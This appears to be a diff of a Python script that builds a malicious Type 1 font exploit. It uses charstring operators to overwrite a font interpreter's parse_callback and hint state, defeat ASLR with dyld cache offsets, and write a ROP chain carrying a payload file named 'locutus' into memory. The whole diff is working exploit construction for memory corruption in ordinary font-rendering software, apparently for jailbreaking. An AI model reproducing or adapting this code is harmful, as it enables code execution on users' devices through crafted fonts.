@@ -24,18 +24,44 @@
 # then use THAT to overwrite hint_mode and parse_callback
 # then use seac, which will call parse_callback(decoder, glyph idx)
 
-import struct
+# BuildCharArray:
+# 0: top (used for decoder offset)
+# 1: parse_callback (used to work around ASLR)
+#    later, parse_callback - expected
+# 2: buildchar (used for buildchar offset, duh!)
+# 3: idx
+# 4: [start of data]
 
-def to_signed_dec(number):
-    global large_int
+
+import struct
+import cPickle as pickle
+
+stuff = [pickle.load(open('../goo/catalog/catalog.txt')), pickle.load(open('../goo/catalog/catalog.txt'))]
+
+def xrepr(number, large_int):
     number %= (2**32)
     if number >= (2**31): number -= (2**32)
-    if -32000 <= number <= 32000:
-        if number != 0 and not large_int:
-            raise Exception('to_signed_dec: nope (%x)' % number)
-    else:
-        large_int = True
-    return str(number)
+    large_int_2 = not (-32000 <= number <= 32000)
+    if large_int and not large_int_2:
+        raise Exception('xrepr: nope (%x)' % number)
+    return str(number), large_int_2
+
+def xrepr_to_small(number, large_int):
+    sd, large_int = xrepr(number, large_int)
+    if large_int:
+        sd += ' dotsection'
+    return sd
+
+def xrepr_to_large(number, large_int):
+    sd, large_int = xrepr(number, large_int)
+    assert large_int
+    return sd
+
+def xrepr_plus_small(number, large_int, numbers2):
+    sd, large_int = xrepr(number, large_int)
+    if large_int:
+        numbers2 = [i << 16 for i in numbers2]
+    return sd + ''.join(' ' + str(i) for i in numbers2)
 
 def encode_unknown(s):
     result = ''
@@ -45,19 +71,51 @@ def encode_unknown(s):
 
 subrs = {}
 
-file0 = 'i am a file'
-file1 = 'i am also a file'
+# this is read by the ROP stuff
+subr0 = open('../locutus/locutus').read()
+stuff[0]['plist_offset'] = len(subr0)
+subr0 += stuff[0]['plist']
+stuff[1]['plist_offset'] = len(subr0)
+subr0 += stuff[1]['plist']
 
-# these are read by the ROP stuff
-subrs[0] = encode_unknown(open('../locutus/locutus').read())
-subrs[1] = encode_unknown(file1)
-#subrs[0] = '0 3735928559 setcurrentpoint return' # 0xdeadbeef
+subrs[0] = encode_unknown(subr0)
 
 # start flex
-subrs[2] = '0 1 callothersubr ' + '0 2 callothersubr '*7 + 'return'
+subrs[3] = '0 1 callothersubr ' + '0 2 callothersubr '*7 + 'return'
+
+# set word at pos, increment pos
+subrs[4] = '''dotsection
+                3 1 25 callothersubr    % load index
+                  2 24 callothersubr    % store value there
+              3 1 25 callothersubr      % load index again
+                1 2 20 callothersubr    % add one
+                3 2 24 callothersubr    % store index
+                return
+                '''
+
+# add the dyld cache offset at 1, and call 4
+subrs[5] = '''  1 1 25
+                  2 20 callothersubr
+              4 callsubr
+              return
+              '''
+
+# add the decoder offset at 0, and call 4
+subrs[6] = '''  0 1 25
+                  2 20 callothersubr
+              4 callsubr
+              return
+              '''
+
+# add the code offset at 2, and call 4
+subrs[7] = '''  2 1 25
+                  2 20 callothersubr
+              4 callsubr
+              return
+              '''
 
 main = '''3 0 setcurrentpoint
-          2 callsubr           % prepare for the first run up
+          3 callsubr           % prepare for the first run up
           -347 42 callothersubr
           callothersubr        % now at 344
           hmoveto hmoveto hmoveto
@@ -67,53 +125,85 @@ main = '''3 0 setcurrentpoint
           hstem3 hstem3 hstem3 hstem3
           hstem3 hstem3 hstem3 hstem3
           hstem3 UNKNOWN_15 UNKNOWN_15 hmoveto
-                               % now x is blend, and y is parse_callback; come back down
-          hstem3 250 42 callothersubr
-          2 callsubr           % start flex so we can get x and y
-          0 0 0 3 0 callothersubr pop pop
+                               % now x is blend, and y is parse_callback; come back down a little
+          hstem3 hstem3
+          3 callsubr           % start flex so we can get x and y
+          0 0 0 3 0 callothersubr 
+
           1 2 24 callothersubr % parse_callback -> bca[1]
-          0 2 24 callothersubr % blend -> bca[0]
+          0 2 24 callothersubr % top -> bca[0]
 
-          0                    % start the <= chain
+          -102 42 callothersubr % back up to get buildchar
+          setcurrentpoint       % now at 344
+
+          hstem3 hstem3 hstem3 hstem3
+          hstem3 hstem3 hstem3 hstem3
+          hstem3 hstem3 hstem3 hstem3
+          hstem3 hstem3 hstem3
+          
+          254 42 callothersubr
+          
+          3 callsubr           % flex again
+          0 0 0 3 0 callothersubr 
+          2 2 24 callothersubr % buildchar -> bca[2]
+
+          4 3 2 24 callothersubr % 4 -> bca[3]
+
+          1 2 0
+                1 1 25 callothersubr       % first
+                  1 1 25 callothersubr     % second
+                    2 div                  % / 2
+                    2 2 22 callothersubr   % * 2
+                    2 21 callothersubr     % x - ((x / 2) * 2)
+
+                  4 27 callothersubr     % 0 <= it ? 1 : 2
+            callsubr                     % call 1 or 2
+            % the subr should push stuff, set y to an appropriate parse_callback, start flex, then go up to 344
           '''
-
-addies = {0x33816765: (open('../goo/catalog/stub.txt').read(), open('../goo/catalog/catalog.txt').read()), 0x0000a000: ('xxxx', ''), 0x34000000: ('xxxx', '')}
-
-subrno = max(filter(lambda a: isinstance(a, int), subrs.keys())) + 1
 
 stack_400_loc = 20
 
-for addy, (stub, catalog) in sorted(addies.items()):
+subrno = 1
+for data in stuff:
+    stub = data['final']
     stub += '\0' * (-len(stub) & 3)
     stub = list(struct.unpack('I'*(len(stub)/4), stub))
-    parse_callback = stub.pop(0)
-    assert addy > 32000
-    assert parse_callback > 32000
-    subr = 'dotsection -%d 42 callothersubr ' % stack_400_loc
-    large_int = False
-    subr += '0 %s setcurrentpoint ' % to_signed_dec(parse_callback)
-    for number in stub:
-        #print hex(number)
-        if (number & 0xffff0000) == 0xfefd0000: # code offset
-            number += 0x10000 + 0x70 + stack_400_loc*4
-        if number == 0xfefefefe: # the subr offset
-            subr += to_signed_dec((subrno+1)*4) + ' '
-        elif (number & 0xffff0000) == 0xfefe0000: # decoder offset
-            subr += to_signed_dec((number - 0xfefe0000) - 0x70 - 257*4) + ' dotsection 0 1 25 callothersubr pop 2 20 callothersubr pop '
-            large_int = False
-        else:
-            subr += to_signed_dec(number) + ' '
-    subr += 'dotsection 2 callsubr %d 42 callothersubr return' % -(344 - stack_400_loc - len(stub))
-    large_int = False
-    subrs[subrno] = subr
-    subrs[subrno+1] = encode_unknown(catalog)
-
-    # the dotsection is to make large_integer false
-    main += '\n' + str(subrno) + ' 1 1 25 callothersubr pop ' + to_signed_dec(addy - 1) + ' dotsection 4 27 callothersubr pop\n'
+    print hex(data['parse_callback'])
+    assert data['parse_callback'] > 32000
+    assert data['actual_parse_callback'] > 32000
     
-    subrno += 2
+    subr = '''1 1 25 callothersubr             %% get parse_callback
+              %s 2 21 callothersubr            %% subtract the real one
+              1 2 24 callothersubr             %% store back
+              -%d 42 callothersubr             %% go up to where we will start popping
+              ''' % (xrepr_to_small(data['actual_parse_callback'], False), stack_400_loc)
+           
+    subr += '0 %s setcurrentpoint ' % xrepr(data['parse_callback'], False)[0]
+    i = 0
+    for number in stub:
+        r = data['relocs'].get(i, 0)
+        i += 4
+        #print hex(number)
+        if r == 0xc: # plist offset in the subr
+            number += data['plist_offset']
+        elif r == 0xd: # code offset
+            subr += xrepr_plus_small(number + 4*4, False, [7]) + ' callsubr '
+            continue
+        elif r == 0xe: # decoder offset
+            subr += xrepr_plus_small(number - 0x70 - 257*4, False, [6]) + ' callsubr '
+            continue
+        elif r == 3: # dyld cache
+            subr += xrepr_plus_small(number, False, [5]) + ' callsubr '
+            continue
+        else:
+            assert r == 0
+        subr += xrepr_plus_small(number, False, [4]) + ' callsubr '
+    subr += 'dotsection 3 callsubr %d 42 callothersubr return' % -(344 - stack_400_loc - len(stub))
 
-main += '''callsubr         % call the selected subr (which should push stuff, set y to an appropriate parse_callback, start flex, then go up to 344)
+    subrs[subrno] = subr
+    subrno += 1
+
+main += '''
            callothersubr
            hstem3 hstem3 hstem3 hstem3
            hstem3 hstem3 hstem3 hstem3
